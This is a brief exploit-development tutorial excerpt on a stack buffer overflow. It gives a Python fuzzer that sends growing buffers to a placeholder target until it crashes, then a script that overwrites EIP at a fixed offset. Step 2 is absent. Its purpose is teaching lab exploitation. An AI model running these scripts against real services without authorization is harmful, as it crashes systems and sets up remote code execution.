1 Fuzzing

Send increasing buffer sizes until the application crashes.

#!/usr/bin/env python3
import socket
import sys
import time

ip = "TARGET_IP"
port = TARGET_PORT
timeout = 5
buffer = b"A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            
            print(f"Sending {len(buffer)} bytes...")
            s.send(b"COMMAND " + buffer + b"\r\n")
            s.recv(1024)
            
    except:
        print(f"Crashed at {len(buffer)} bytes!")
        sys.exit(0)
    
    buffer += b"A" * 100
    time.sleep(1)

3 Verify EIP Control

#!/usr/bin/env python3
import socket

ip = "TARGET_IP"
port = TARGET_PORT
offset = 1024  # Found in step 2

buffer = b"A" * offset
buffer += b"B" * 4  # Should overwrite EIP with 42424242
buffer += b"C" * (2000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(b"COMMAND " + buffer + b"\r\n")
s.close()

# EIP should now be 42424242 (BBBB)
